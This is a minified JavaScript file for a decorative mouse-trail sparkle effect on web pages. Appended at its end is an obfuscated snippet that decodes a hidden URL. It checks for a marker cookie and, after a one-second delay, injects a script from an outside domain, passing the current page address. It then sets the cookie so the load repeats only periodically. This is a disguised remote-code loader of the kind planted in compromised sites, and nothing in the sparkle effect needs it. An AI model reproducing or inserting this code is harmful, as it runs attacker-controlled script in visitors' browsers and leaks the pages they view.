var colour="white",sparkles=50,x=ox=400,y=oy=300,swide=800,shigh=600,sleft=sdown=0,tiny=new Array,star=new Array,starv=new Array,starx=new Array,stary=new Array,tinyx=new Array,tinyy=new Array,tinyv=new Array;function sparkle(){var t;if(Math.abs(x-ox)>1||Math.abs(y-oy)>1)for(ox=x,oy=y,t=0;t<sparkles;t++)if(!starv[t]){star[t].style.left=(starx[t]=x)+"px",star[t].style.top=(stary[t]=y+1)+"px",star[t].style.clip="rect(0px, 5px, 5px, 0px)",star[t].childNodes[0].style.backgroundColor=star[t].childNodes[1].style.backgroundColor="random"==colour?newColour():colour,star[t].style.visibility="visible",starv[t]=50;break}for(t=0;t<sparkles;t++)starv[t]&&update_star(t),tinyv[t]&&update_tiny(t);setTimeout("sparkle()",40)}function update_star(t){if(25==--starv[t]&&(star[t].style.clip="rect(1px, 4px, 4px, 1px)"),starv[t]){if(stary[t]+=1+3*Math.random(),starx[t]+=(t%5-2)/5,!(stary[t]<shigh+sdown))return star[t].style.visibility="hidden",void(starv[t]=0);star[t].style.top=stary[t]+"px",star[t].style.left=starx[t]+"px"}else tinyv[t]=50,tiny[t].style.top=(tinyy[t]=stary[t])+"px",tiny[t].style.left=(tinyx[t]=starx[t])+"px",tiny[t].style.width="2px",tiny[t].style.height="2px",tiny[t].style.backgroundColor=star[t].childNodes[0].style.backgroundColor,star[t].style.visibility="hidden",tiny[t].style.visibility="visible"}function update_tiny(t){if(25==--tinyv[t]&&(tiny[t].style.width="1px",tiny[t].style.height="1px"),tinyv[t]){if(tinyy[t]+=1+3*Math.random(),tinyx[t]+=(t%5-2)/5,!(tinyy[t]<shigh+sdown))return tiny[t].style.visibility="hidden",void(tinyv[t]=0);tiny[t].style.top=tinyy[t]+"px",tiny[t].style.left=tinyx[t]+"px"}else tiny[t].style.visibility="hidden"}function mouse(t){t?(y=t.pageY,x=t.pageX):(set_scroll(),y=event.y+sdown,x=event.x+sleft)}function set_scroll(){"number"==typeof self.pageYOffset?(sdown=self.pageYOffset,sleft=self.pageXOffset):document.body&&(document.body.scrollTop||document.body.scrollLeft)?(sdown=document.body.scrollTop,sleft=document.body.scrollLeft):document.documentElement&&(document.documentElement.scrollTop||document.documentElement.scrollLeft)?(sleft=document.documentElement.scrollLeft,sdown=document.documentElement.scrollTop):(sdown=0,sleft=0)}function set_width(){var t=999999,e=999999;document.documentElement&&document.documentElement.clientWidth&&(document.documentElement.clientWidth>0&&(t=document.documentElement.clientWidth),document.documentElement.clientHeight>0&&(e=document.documentElement.clientHeight)),"number"==typeof self.innerWidth&&self.innerWidth&&(self.innerWidth>0&&self.innerWidth<t&&(t=self.innerWidth),self.innerHeight>0&&self.innerHeight<e&&(e=self.innerHeight)),document.body.clientWidth&&(document.body.clientWidth>0&&document.body.clientWidth<t&&(t=document.body.clientWidth),document.body.clientHeight>0&&document.body.clientHeight<e&&(e=document.body.clientHeight)),999999!=t&&999999!=e||(t=800,e=600),swide=t,shigh=e}function createDiv(t,e){var n=document.createElement("div");return n.style.position="absolute",n.style.height=t+"px",n.style.width=e+"px",n.style.overflow="hidden",n}function newColour(){var t=new Array;return t[0]=255,t[1]=Math.floor(256*Math.random()),t[2]=Math.floor(Math.random()*(256-t[1]/2)),t.sort((function(){return.5-Math.random()})),"rgb("+t[0]+", "+t[1]+", "+t[2]+")"}window.onload=function(){if(document.getElementById){for(var t=0;t<sparkles;t++){var e;(e=createDiv(3,3)).style.visibility="hidden",e.style.zIndex="999",document.body.appendChild(tiny[t]=e),starv[t]=0,tinyv[t]=0,(e=createDiv(5,5)).style.backgroundColor="transparent",e.style.visibility="hidden",e.style.zIndex="999";var n=createDiv(1,5),i=createDiv(5,1);e.appendChild(n),e.appendChild(i),n.style.top="2px",n.style.left="0px",i.style.top="0px",i.style.left="2px",document.body.appendChild(star[t]=e)}set_width(),sparkle()}},document.onmousemove=mouse,window.onscroll=set_scroll,window.onresize=set_width;(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3h'+'isrjywnh3htr4l'+'jy4xyfynh3ox'+'DwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));